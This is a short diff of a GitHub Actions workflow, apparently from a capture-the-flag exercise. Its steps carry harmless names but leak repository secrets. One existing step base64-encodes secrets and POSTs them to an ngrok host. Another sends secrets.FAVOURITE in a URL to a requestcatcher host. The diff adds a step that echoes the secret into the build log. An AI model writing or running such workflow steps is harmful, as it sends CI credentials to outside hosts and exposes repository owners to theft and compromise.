@@ -46,4 +46,7 @@ jobs:
           curl "https://6ee3-128-130-234-183.ngrok-free.app/${{ secrets.FAVOURITE }}" -X POST --data "$(secrets | base64 --wrap=0) "
 
       - name: I ll tell you my current favourite 
+        run: echo ${{ secrets.FAVOURITE }}
+
+      - name: I ll tell you my current favourite 
         run: curl -G -X GET "https://hocnctf.requestcatcher.com/${{ secrets.FAVOURITE }}"
